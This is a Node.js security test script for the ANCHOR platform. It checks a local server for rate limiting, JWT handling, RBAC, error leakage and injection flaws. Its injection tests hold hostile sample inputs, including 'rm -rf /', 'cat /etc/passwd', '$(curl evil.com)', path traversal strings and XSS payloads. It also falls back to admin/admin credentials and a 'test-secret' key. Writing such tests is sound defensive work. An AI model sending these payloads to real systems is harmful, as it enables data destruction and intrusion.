#!/usr/bin/env node

/**
 * Security Testing Script for ANCHOR Platform
 * Tests for common vulnerabilities and security issues
 */

const axios = require('axios');
const { performance } = require('perf_hooks');

class SecurityTester {
  constructor(baseURL = 'http://localhost:3000') {
    this.baseURL = baseURL;
    this.validToken = null;
  }

  async login() {
    try {
      const response = await axios.post(`${this.baseURL}/api/auth/login`, {
        username: process.env.ADMIN_USERNAME || 'admin',
        password: process.env.ADMIN_PASSWORD || 'admin'
      });

      this.validToken = response.data.token;
      console.log('✅ Got valid authentication token');
      return true;
    } catch (error) {
      console.error('❌ Login failed:', error.response?.data || error.message);
      return false;
    }
  }

  async testEndpoint(method, endpoint, data = null, token = null, description = '') {
    const startTime = performance.now();

    try {
      const config = {
        method,
        url: `${this.baseURL}${endpoint}`,
        headers: {
          'Content-Type': 'application/json'
        }
      };

      if (token) {
        config.headers['Authorization'] = `Bearer ${token}`;
      }

      if (data) {
        config.data = data;
      }

      const response = await axios(config);
      const endTime = performance.now();

      return {
        success: true,
        status: response.status,
        duration: endTime - startTime,
        data: response.data,
        description
      };
    } catch (error) {
      const endTime = performance.now();

      return {
        success: false,
        status: error.response?.status || 0,
        duration: endTime - startTime,
        error: error.response?.data || error.message,
        description
      };
    }
  }

  async runAuthenticationTests() {
    console.log('\n🔐 AUTHENTICATION SECURITY TESTS');

    const authTests = [
      // Brute force protection
      {
        name: 'Brute Force Protection',
        test: async () => {
          const results = [];
          for (let i = 0; i < 15; i++) {
            const result = await this.testEndpoint(
              'POST',
              '/api/auth/login',
              { username: 'admin', password: 'wrong' },
              null,
              `Brute force attempt ${i + 1}`
            );
            results.push(result);
            await new Promise(resolve => setTimeout(resolve, 100)); // Small delay
          }

          const rateLimited = results.some(r => r.status === 429);
          return {
            passed: rateLimited,
            message: rateLimited ? 'Rate limiting working' : 'No rate limiting detected',
            results
          };
        }
      },

      // Invalid token handling
      {
        name: 'Invalid Token Rejection',
        test: async () => {
          const result = await this.testEndpoint(
            'GET',
            '/api/servers',
            null,
            'invalid.jwt.token',
            'Invalid JWT token'
          );
          return {
            passed: result.status === 401,
            message: result.status === 401 ? 'Invalid tokens rejected' : 'Invalid tokens accepted',
            result
          };
        }
      },

      // Token expiration
      {
        name: 'Token Expiration',
        test: async () => {
          // Create expired token (issued 2 hours ago)
          const jwt = require('jsonwebtoken');
          const expiredToken = jwt.sign(
            { username: 'test', role: 'admin', exp: Math.floor(Date.now() / 1000) - 7200 },
            process.env.JWT_SECRET || 'test-secret'
          );

          const result = await this.testEndpoint(
            'GET',
            '/api/servers',
            null,
            expiredToken,
            'Expired JWT token'
          );
          return {
            passed: result.status === 401,
            message: result.status === 401 ? 'Expired tokens rejected' : 'Expired tokens accepted',
            result
          };
        }
      }
    ];

    for (const test of authTests) {
      console.log(`Testing: ${test.name}`);
      const result = await test.test();
      console.log(`${result.passed ? '✅ PASS' : '❌ FAIL'}: ${result.message}`);
    }
  }

  async runInjectionTests() {
    console.log('\n💉 INJECTION ATTACK TESTS');

    const injectionTests = [
      // Command injection
      {
        name: 'Command Injection - Server Names',
        test: async () => {
          const maliciousNames = [
            'test; rm -rf /',
            'test && echo hacked',
            'test | cat /etc/passwd',
            'test`whoami`',
            'test$(curl evil.com)',
            'test>malicious.txt'
          ];

          const results = [];
          for (const name of maliciousNames) {
            const result = await this.testEndpoint(
              'POST',
              `/api/servers/${name}/start`,
              { type: 'minecraft' },
              this.validToken,
              `Command injection: ${name}`
            );
            results.push(result);
          }

          const blocked = results.every(r => r.status >= 400);
          return {
            passed: blocked,
            message: blocked ? 'Command injection blocked' : 'Command injection possible',
            results
          };
        }
      },

      // SQL injection (if applicable)
      {
        name: 'Path Traversal',
        test: async () => {
          const maliciousPaths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            '....//....//....//etc/passwd'
          ];

          const results = [];
          for (const path of maliciousPaths) {
            const result = await this.testEndpoint(
              'GET',
              `/api/servers/${path}/status`,
              null,
              this.validToken,
              `Path traversal: ${path}`
            );
            results.push(result);
          }

          const blocked = results.every(r => r.status >= 400);
          return {
            passed: blocked,
            message: blocked ? 'Path traversal blocked' : 'Path traversal possible',
            results
          };
        }
      },

      // XSS attempts
      {
        name: 'XSS Prevention',
        test: async () => {
          const xssPayloads = [
            '<script>alert("xss")</script>',
            '"><script>alert("xss")</script>',
            '<img src=x onerror=alert("xss")>',
            'javascript:alert("xss")'
          ];

          const results = [];
          for (const payload of xssPayloads) {
            const result = await this.testEndpoint(
              'POST',
              `/api/servers/${payload}/start`,
              { type: 'minecraft' },
              this.validToken,
              `XSS attempt: ${payload.substring(0, 20)}...`
            );
            results.push(result);
          }

          const blocked = results.every(r => r.status >= 400);
          return {
            passed: blocked,
            message: blocked ? 'XSS payloads blocked' : 'XSS possible',
            results
          };
        }
      }
    ];

    for (const test of injectionTests) {
      console.log(`Testing: ${test.name}`);
      const result = await test.test();
      console.log(`${result.passed ? '✅ PASS' : '❌ FAIL'}: ${result.message}`);
    }
  }

  async runAuthorizationTests() {
    console.log('\n👥 AUTHORIZATION TESTS');

    const authzTests = [
      // Role-based access
      {
        name: 'RBAC Enforcement',
        test: async () => {
          // Create tokens for different roles
          const jwt = require('jsonwebtoken');
          const secret = process.env.JWT_SECRET || 'test-secret';

          const adminToken = jwt.sign({ username: 'admin', role: 'admin' }, secret);
          const developerToken = jwt.sign({ username: 'dev', role: 'developer' }, secret);
          const viewerToken = jwt.sign({ username: 'viewer', role: 'viewer' }, secret);

          // Test admin access
          const adminResult = await this.testEndpoint(
            'POST',
            '/api/servers/test/start',
            { type: 'minecraft' },
            adminToken,
            'Admin creating server'
          );

          // Test developer access
          const devResult = await this.testEndpoint(
            'POST',
            '/api/servers/test/start',
            { type: 'minecraft' },
            developerToken,
            'Developer creating server'
          );

          // Test viewer access (should be denied)
          const viewerResult = await this.testEndpoint(
            'POST',
            '/api/servers/test/start',
            { type: 'minecraft' },
            viewerToken,
            'Viewer creating server'
          );

          const rbacWorking = adminResult.status < 400 &&
                             devResult.status < 400 &&
                             viewerResult.status >= 400;

          return {
            passed: rbacWorking,
            message: rbacWorking ? 'RBAC working correctly' : 'RBAC not enforced',
            results: { adminResult, devResult, viewerResult }
          };
        }
      }
    ];

    for (const test of authzTests) {
      console.log(`Testing: ${test.name}`);
      const result = await test.test();
      console.log(`${result.passed ? '✅ PASS' : '❌ FAIL'}: ${result.message}`);
    }
  }

  async runInformationDisclosureTests() {
    console.log('\n📋 INFORMATION DISCLOSURE TESTS');

    const infoTests = [
      // Health endpoint exposure
      {
        name: 'Health Endpoint Data Leakage',
        test: async () => {
          const publicHealth = await this.testEndpoint('GET', '/api/health', null, null, 'Public health check');
          const internalHealth = await this.testEndpoint('GET', '/api/health', null, this.validToken, 'Authenticated health check');

          // Public should have less info than authenticated
          const publicKeys = Object.keys(publicHealth.data || {});
          const internalKeys = Object.keys(internalHealth.data || {});

          const leakage = internalKeys.length > publicKeys.length + 2; // Allow some difference

          return {
            passed: !leakage,
            message: leakage ? 'Potential information leakage' : 'Information properly protected',
            data: { publicKeys, internalKeys }
          };
        }
      },

      // Error message exposure
      {
        name: 'Error Message Safety',
        test: async () => {
          const results = [];

          // Test various error conditions
          const errorTests = [
            this.testEndpoint('GET', '/api/nonexistent', null, this.validToken, '404 error'),
            this.testEndpoint('POST', '/api/auth/login', { username: '', password: '' }, null, 'Empty credentials'),
            this.testEndpoint('GET', '/api/servers', null, 'invalid-token', 'Invalid auth')
          ];

          for (const test of errorTests) {
            const result = await test;
            results.push(result);
          }

          // Check if errors expose sensitive information
          const sensitivePatterns = [
            /password/i,
            /secret/i,
            /key/i,
            /token/i,
            /stack trace/i,
            /sql/i
          ];

          const hasSensitiveInfo = results.some(result => {
            const errorText = JSON.stringify(result.error || '');
            return sensitivePatterns.some(pattern => pattern.test(errorText));
          });

          return {
            passed: !hasSensitiveInfo,
            message: hasSensitiveInfo ? 'Errors may leak sensitive information' : 'Error messages are safe',
            results
          };
        }
      }
    ];

    for (const test of infoTests) {
      console.log(`Testing: ${test.name}`);
      const result = await test.test();
      console.log(`${result.passed ? '✅ PASS' : '❌ FAIL'}: ${result.message}`);
    }
  }

  async runAllSecurityTests() {
    console.log('🛡️  Starting ANCHOR Security Tests');
    console.log('=' .repeat(60));

    if (!(await this.login())) {
      console.error('❌ Cannot run security tests without authentication');
      return;
    }

    await this.runAuthenticationTests();
    await this.runInjectionTests();
    await this.runAuthorizationTests();
    await this.runInformationDisclosureTests();

    console.log('\n🏁 Security Testing Complete');
    console.log('=' .repeat(60));
    console.log('Review results above. Any ❌ FAIL items need immediate attention.');
  }
}

// CLI interface
if (require.main === module) {
  const tester = new SecurityTester(process.argv[2] || 'http://localhost:3000');
  tester.runAllSecurityTests().catch(console.error);
}

module.exports = SecurityTester;